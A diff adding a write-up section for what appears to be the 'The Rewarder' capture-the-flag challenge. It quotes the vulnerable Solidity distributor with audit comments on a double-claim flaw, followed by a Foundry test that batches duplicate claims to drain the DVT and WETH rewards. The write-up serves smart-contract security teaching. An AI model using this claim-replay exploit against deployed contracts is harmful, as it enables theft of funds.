@@ -124,3 +124,120 @@ function test_sideEntrance()public checkSolvedByPlayer{
 }
 ```
 ## 5. The Rewarder
+In ```TheRewarderDistributor.sol``` line:71 -
+```
+// @audit-issue this function is very centralized and dangerous, anyone can call it and sabotage
+// distributions
+function clean(IERC20[] calldata tokens) external {
+        for (uint256 i = 0; i < tokens.length; i++) {
+            IERC20 token = tokens[i];
+            if (distributions[token].remaining == 0) {
+                token.transfer(owner, token.balanceOf(address(this)));
+            }
+        }
+    }
+```
+
+Again :
+```
+function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
+        Claim memory inputClaim;
+        IERC20 token;
+        uint256 bitsSet; // accumulator
+        uint256 amount;
+
+        for (uint256 i = 0; i < inputClaims.length; i++) {
+            inputClaim = inputClaims[i];
+
+            // @audit-info always 0,but we don't care
+            uint256 wordPosition = inputClaim.batchNumber / 256;
+            uint256 bitPosition = inputClaim.batchNumber % 256;
+
+            // @audit-info first iteration we enter here since token=0 and inputToken[0]=DVT
+            // @audit-issue In the second iteration since token and inputTokens[1]=DVT,we don't enter here!
+            if (token != inputTokens[inputClaim.tokenIndex]) {
+                // @audit-issue first iteration we skip this since token=0
+                if (address(token) != address(0)) {
+                    // @audit-issue we're able to skip the _setClaimed call in the first iteration and
+                    // The following iterations as long as we have multiple claims with the same token!!!
+                    // That way we avoid the bitmap check and the revert here 
+                    if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
+                }
+                // @audit-info After first iteration: token=DVT
+                token = inputTokens[inputClaim.tokenIndex];
+                bitsSet = 1 << bitPosition; // set bit at given position
+                amount = inputClaim.amount;
+            } else {
+                bitsSet = bitsSet | 1 << bitPosition;
+                amount += inputClaim.amount;
+            }
+
+            // for the last claim
+            if (i == inputClaims.length - 1) {
+                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
+            }
+
+            bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
+            bytes32 root = distributions[token].roots[inputClaim.batchNumber];
+
+            if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();
+
+            inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
+        }
+    }
+```
+Test file:
+```
+function test_theRewarder() public checkSolvedByPlayer {
+        string memory dvtJson=vm.readFile("test/the-rewarder/dvt-distribution.json");
+        Reward[] memory dvtRewards=abi.decode(vm.parseJson(dvtJson),(Reward[]));
+        
+        string memory wethJson=vm.readFile("test/the-rewarder/weth-distribution.json");
+        Reward[] memory wethRewards=abi.decode(vm.parseJson(wethJson),(Reward[]));
+
+        bytes32[] memory dvtLeaves=_loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves=_loadRewards("/test/the-rewarder/weth-distribution.json");
+
+
+        uint256 playerDvtAmount;
+        bytes32[] memory playerDvtProof;
+        uint256 playerWethAmount;
+        bytes32[] memory playerWethProof;
+        for(uint i=0;i<dvtRewards.length;i++){
+            if(dvtRewards[i].beneficiary==player){
+                playerDvtAmount=dvtRewards[i].amount;
+                playerWethAmount=wethRewards[i].amount;
+                playerDvtProof=merkle.getProof(dvtLeaves,i);
+                playerWethProof=merkle.getProof(wethLeaves,i);
+                break;
+            }
+        }
+        require(playerDvtAmount>0,"player not found in DVT distribution");
+        require(playerWethAmount>0,"player not found in WETH distribution");
+
+        IERC20[] memory tokensToClaim=new IERC20[](2);
+        tokensToClaim[0]=IERC20(address(dvt));
+        tokensToClaim[1]=IERC20(address(weth));
+
+        uint256 totalClaimsNeeded=(TOTAL_DVT_DISTRIBUTION_AMOUNT/playerDvtAmount)+
+                        (TOTAL_WETH_DISTRIBUTION_AMOUNT/playerWethAmount);
+        uint256 dvtClaims=TOTAL_DVT_DISTRIBUTION_AMOUNT/playerDvtAmount;
+
+        Claim[] memory claims=new Claim[] (totalClaimsNeeded);
+
+        for(uint256 i=0;i<totalClaimsNeeded;i++){
+            claims[i]=Claim({
+                batchNumber:0,
+                amount:i<dvtClaims ? playerDvtAmount:playerWethAmount,
+                tokenIndex:i<dvtClaims?0:1,
+                proof:i<dvtClaims ? playerDvtProof : playerWethProof
+            });
+        }
+
+        distributor.claimRewards({inputClaims:claims, inputTokens:tokensToClaim});
+        dvt.transfer(recovery,dvt.balanceOf(player));
+        weth.transfer(recovery,weth.balanceOf(player));
+
+    }
+
+```
